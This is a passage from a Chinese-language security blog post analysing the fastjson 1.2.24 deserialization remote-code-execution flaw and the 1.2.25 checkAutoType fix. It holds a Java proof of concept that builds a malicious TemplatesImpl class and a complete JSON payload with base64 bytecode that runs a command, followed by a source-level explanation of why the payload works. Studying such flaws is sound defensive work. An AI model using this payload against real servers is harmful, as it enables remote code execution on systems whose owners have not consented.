class="comment">//设置不重复的类名</span></span><br><span class="line">        String randomClassName = <span class="string">"LaLa"</span>+System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置满足条件的父类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="comment">//获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] lalaByteCodes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lalaByteCodes;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//生成payload，触发payload</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">poc</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//生成攻击payload</span></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = getevilbyte();<span class="comment">//生成恶意类的字节码</span></span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);<span class="comment">//使用base64封装</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;"</span>+</span><br><span class="line">                <span class="string">"\"@type\":\""</span> + NASTY_CLASS +<span class="string">"\","</span>+</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode_base64+<span class="string">"\"],"</span>+</span><br><span class="line">                <span class="string">"'_name':'a.b',"</span>+</span><br><span class="line">                <span class="string">"'_tfactory':&#123; &#125;,"</span>+</span><br><span class="line">                <span class="string">"'_outputProperties':&#123; &#125;"</span>+</span><br><span class="line">                <span class="string">"&#125;\n"</span>;</span><br><span class="line">        <span class="comment">//此处删除了一些我觉得没有用的参数（第二个_name，_version，allowedProtocols），并没有发现有什么影响</span></span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        <span class="comment">//服务端触发payload</span></span><br><span class="line">	    ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//main函数调用以下poc而已</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            poc();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到payload使用<code>@type</code>反序列化了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类。</p>
<p>最终payload输出如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARsYWxhAQAMSW5uZXJDbGFzc2VzAQAcTOeJiOacrDI0L2pkazd1MjFfbWluZSRsYWxhOwEAClNvdXJjZUZpbGUBABFqZGs3dTIxX21pbmUuamF2YQwABAAFBwATAQAa54mI5pysMjQvamRrN3UyMV9taW5lJGxhbGEBABBqYXZhL2xhbmcvT2JqZWN0AQAV54mI5pysMjQvamRrN3UyMV9taW5lAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAFQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABcAGAoAFgAZAQAEY2FsYwgAGwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAB0AHgoAFgAfAQARTGFMYTg4MTIwNDQ1NzYzMDABABNMTGFMYTg4MTIwNDQ1NzYzMDA7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAADwAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&apos;_outputProperties&apos;:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure>
<p> 7u21 那篇文中总结得到恶意TemplatesImple类需要满足如下条件。</p>
<ol>
<li>TemplatesImpl类的 <code>_name</code> 变量 != null</li>
<li>TemplatesImpl类的<code>_class</code>变量 == null</li>
<li>TemplatesImpl类的 <code>_bytecodes</code> 变量 != null</li>
<li>TemplatesImpl类的<code>_bytecodes</code>是我们代码执行的类的字节码。<code>_bytecodes</code>中的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</li>
<li>我们需要执行的恶意代码写在<code>_bytecodes</code> 变量对应的类的静态方法或构造方法中。</li>
<li>TemplatesImpl类的<code>_tfactory</code>需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类</li>
</ol>
<p>显而易见1-3，5均符合（_class没有赋值即为null）。</p>
<p>然后我们调用满足条件的恶意TemplatesImple类的getOutputProperties方法，完成RCE。这是fastjson将自动调用字段的getter方法导致的，我们看一下getOutputProperties方法是否满足自动调用getter方法的条件：</p>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li style="list-style: none"><input type="checkbox" checked> 方法名长度大于等于4    </li>
<li style="list-style: none"><input type="checkbox" checked> 非静态方法</li>
<li style="list-style: none"><input type="checkbox" checked> 以get开头且第4个字母为大写</li>
<li style="list-style: none"><input type="checkbox" checked> 无传入参数</li>
<li style="list-style: none"><input type="checkbox" checked> 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong（上面举例的时候说过Properties继承自Hashtables，实现了Map，所以符合）</li>
</ul>
<p>那么存在以下三个问题</p>
<ol>
<li>为什么<code>_tfactory</code>可以是一个空的对象，而不是一个拥有getExternalExtensionsMap的类？</li>
<li>_bytecodes为什么不再是字节码，而是需要base64编码？</li>
<li>我们要调用TemplatesImple类的getOutputProperties方法，但是为什么是<code>_outputProperties</code>字段，多了一个<code>_</code>？</li>
</ol>
<h3 id="tfactory为空的说明"><a href="#tfactory为空的说明" class="headerlink" title="_tfactory为空的说明"></a>_tfactory为空的说明</h3><p>在fastjson组件对于以上这一串东西进行解析时，会先解析出@type来还原出TemplatesImpl类。然后再根据之后的字段将TemplatesImpl类的属性赋值，至于赋值的内容会重新进行一次解析。</p>
<p>在看对于赋值内容的解析步骤时，会发现当赋值的值为一个空的Object对象时，会新建一个需要赋值的字段应有的格式的新对象实例。</p>
<p><code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:627</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae255pusej321d145qc2.jpg" alt="_tfactory为空.png"></p>
<p><code>/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:62</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25093pcj31kb17qwk6.jpg" alt="_tfactory为空2.png"></p>
<p>那么_tfactory的应有的格式是哪来的呢，从定义来。</p>
<p><code>/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A reference to the transformer factory that this templates</span></span><br><span class="line"><span class="comment"> * object belongs to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
<p>所以之所以_tfactory的json字符串的值为空是OK的。</p>
<h3 id="bytecodes需要base64编码"><a href="#bytecodes需要base64编码" class="headerlink" title="_bytecodes需要base64编码"></a>_bytecodes需要base64编码</h3><p>跟踪<code>_bytecodes</code>字段的值处理，同样还是刚才的地方，但是由于<code>_bytecodes</code>的值不是对象，进入另一个赋值方式。</p>
<p><code>/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:71</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae24s31kmj31hn199n2h.jpg" alt="base64-1.png"></p>
<p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">//进去后判断字段类型，当前是class[B byte数组，上面啥都不做，进行解析</span></span><br><span class="line">...</span><br><span class="line">      &#125;</span><br><span class="line">      JSONArray array = <span class="keyword">new</span> JSONArray();</span><br><span class="line">      parser.parseArray(componentClass, array, fieldName);<span class="comment">//进入此处</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> (T) toObjectArray(parser, componentClass, array);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseArray(java.lang.reflect.Type, java.util.Collection, java.lang.Object)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//type=class [B byte数组</span></span><br><span class="line"><span class="comment">//fieldName = _bytecodes</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseArray</span><span class="params">(Type type, Collection array, Object fieldName)</span> </span>&#123;</span><br><span class="line">...<span class="comment">//这边就是在根据type类型进行不同的处理</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">//byte数组进入此处</span></span><br><span class="line">                        val = deserializer.deserialze(<span class="keyword">this</span>, type, i);<span class="comment">//在这句进行解析</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    array.add(val);</span><br><span class="line">                    checkListResolve(array);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (lexer.token() == JSONToken.COMMA) &#123;</span><br><span class="line">                    lexer.nextToken(deserializer.getFastMatchToken());</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.setContext(context);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> JSONLexer lexer = parser.lexer;</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;</span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//我们输入的json串中， _bytecodes 字段对应的值是String类型字符串，进入此处</span></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = lexer.bytesValue();<span class="comment">//进入此处，获取json串的值恢复到byte数组</span></span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">return</span> (T) bytes;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>com.alibaba.fastjson.parser.JSONScanner#bytesValue</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] bytesValue() &#123;</span><br><span class="line">    <span class="keyword">return</span> IOUtils.decodeBase64(text, np + <span class="number">1</span>, sp);<span class="comment">//base64解码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见在代码逻辑中，字段的值从String恢复成<code>byte[]</code>，会经过一次base64解码。这是应该是fastjson在传输<code>byte[]</code>中做的一个内部规定。序列化时应该也会对byte[]自动base64编码。</p>
<p>try一下，果然如此。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae246qlpuj314y0zpgpt.jpg" alt="base64-3.png"></p>
<h3 id="getOutputProperties字段-gt-getOutputProperties方法"><a href="#getOutputProperties字段-gt-getOutputProperties方法" class="headerlink" title="_getOutputProperties字段 =&gt; getOutputProperties方法"></a>_getOutputProperties字段 =&gt; getOutputProperties方法</h3><p>简单的删掉<code>_</code>试一下：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23y11clj31z60yftlz.jpg" alt="_outputProperties.png"></p>
<p>可以发现，并不会对结果造成什么影响，可见这个_不是必须的。</p>
<p>那么是在哪里对这个_进行了处理呢？</p>
<p>在字段解析之前，会对于当前字段进行一次智能匹配<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType,</span></span></span><br><span class="line"><span class="function"><span class="params">                              Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer; </span><br><span class="line">        FieldDeserializer fieldDeserializer = smartMatch(key);<span class="comment">//进入此处，根据json串的字段名来获取字段反序列化解析器。</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> FieldDeserializer <span class="title">smartMatch</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       FieldDeserializer fieldDeserializer = getFieldDeserializer(key);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (fieldDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">boolean</span> startsWithIs = key.startsWith(<span class="string">"is"</span>);</span><br><span class="line">           ...</span><br><span class="line">               <span class="comment">//以下省略了对于is开头的字段的一些判断逻辑。</span></span><br><span class="line">               <span class="comment">//好像满足了一定条件，会去跟对应的符合getter，settger的方法名匹配。</span></span><br><span class="line">               <span class="comment">//好像又回到is方法可以调用不了，但是真的脑壳疼，漏洞关键也不在于此，就不纠结了。</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//遍历我们输入的key的每一个字符，匹配第一个-或_替换为空</span></span><br><span class="line">       <span class="keyword">if</span> (fieldDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">boolean</span> snakeOrkebab = <span class="keyword">false</span>;</span><br><span class="line">           String key2 = <span class="keyword">null</span>;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">               <span class="keyword">char</span> ch = key.charAt(i);</span><br><span class="line">               <span class="keyword">if</span> (ch == <span class="string">'_'</span>) &#123;</span><br><span class="line">                   snakeOrkebab = <span class="keyword">true</span>;</span><br><span class="line">                   key2 = key.replaceAll(<span class="string">"_"</span>, <span class="string">""</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'-'</span>) &#123;</span><br><span class="line">                   snakeOrkebab = <span class="keyword">true</span>;</span><br><span class="line">                   key2 = key.replaceAll(<span class="string">"-"</span>, <span class="string">""</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        <span class="comment">//接下来根据替换后的key2，去寻找对应符合getter，setter的方法名进行匹配。</span></span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23khmmfj328l12jguc.jpg" alt="_output ok.png"></p>
<p>然后在赋值的时候完美触发getoutputProperties方法。</p>
<p><code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span> <span class="comment">//</span></span><br><span class="line">            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = fieldInfo.method;</span><br><span class="line">            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                    <span class="comment">//判断特殊类型</span></span><br><span class="line">                    ...</span><br><span class="line">                    <span class="comment">//进入getoutputProperties方法的返回值是Properties符合该一项（之前说过）</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    	<span class="comment">//进入调用，object是我们的恶意TemplatesImpl类</span></span><br><span class="line">                        Map map = (Map) method.invoke(object);</span><br></pre></td></tr></table></figure>
<p>那么以上流程就是<code>_getOutputProperties</code>字段 =&gt; <code>getOutputProperties</code>方法具体演变的细节。那么以上分析结果也让我们知道加个骚气的小杠<code>-</code>应该也是可以的。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23atakrj31yj0wl49q.jpg" alt="-output 也可以.png"></p>
<p>至此就完成了在知道Templates触发类原理的情况下，变形衍生到了fastjson中完成RCE。</p>
<blockquote>
<p>至于Templates恶意类的第二个触发点，xalan 2.7.2的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，在JDK反序列化Gadgets7u21一文中有补充说明，这里就不多说了。</p>
</blockquote>
<h2 id="Fastjson抗争的一生"><a href="#Fastjson抗争的一生" class="headerlink" title="Fastjson抗争的一生"></a>Fastjson抗争的一生</h2><p>在讲述完最开始引发漏洞的1.2.24版本之后，其实接下来的部分才是开起此篇的初衷。但是因为基础实在是差+懒，直到现在才开始正文。</p>
<h3 id="1-2-24漏洞版本修复"><a href="#1-2-24漏洞版本修复" class="headerlink" title="1.2.24漏洞版本修复"></a>1.2.24漏洞版本修复</h3><p>在1.2.25版本，针对1.2.24版本进行了修复。</p>
<p>我们可以总结以下1.2.24版本的漏洞产生原因：</p>
<ol>
<li><code>@type</code>该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。<br>这个过程会被叫做fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的@type加载任意类+符合条件的setter与getter变成了反序列化利用点（个人总结的三要素中的反序列化漏洞触发点）。</li>
<li>在找到可以调用的setter、getter之后，从这个可以被出发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。（个人总结三要素中的反序列化利用链）</li>
<li>沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）（个人总结三要素中的反序列化payload触发点）</li>
</ol>
<blockquote>
<p>可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-collections中则是反射机制（这在@type中的getter、setter函数调用中也被用到）。我们应该对这两个点产生敏感性。</p>
</blockquote>
<p>修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于<code>@type</code>标签进行一个白名单+黑名单的限制机制。</p>
<p>使用万能的idea对两个版本的jar包进行对比</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22z6chbj32bc0qx41t.jpg" alt="修复1.2.24.png"></p>
<p>可以注意到，在解析json串的<code>DefaultJSONParser类</code>中做了一行代码的修改。当输入的键值是<code>@type</code>时，原本直接对值对应的类进行加载。现在会将值ref传入<code>checkAutoType方法</code>中。</p>
<p>checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数<code>AutoTypeSupport</code>。参考<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">官方wiki</a></p>
<p>Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true); （关闭白名单机制）</span><br></pre></td></tr></table></figure>
<p>由于checkAutoType中两条路线的代码是穿插的，我们先来看默认<code>AutoTypeSupport为False</code>时的代码。</p>
<p><code>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(开启白名单机制)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//一些固定类型的判断，此处不会对clazz进行赋值，此处省略</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="comment">//进行黑名单匹配，匹配中，直接报错退出</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">//此处省略了当clazz不为null时的处理情况，与expectClass有关</span></span><br><span class="line">    	<span class="comment">//但是我们这里输入固定是null，不执行此处代码</span></span><br><span class="line">    </span><br><span class="line">    	<span class="comment">//可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">//执行不到此处</span></span><br><span class="line">    	<span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以得出在默认的<code>AutoTypeSupport为False</code>时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。</p>
<p>看一下默认黑名单，默认白名单（最下面，默认为空）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22owggwj30q80s1jt6.jpg" alt="修复1.2.24黑名单.png"></p>
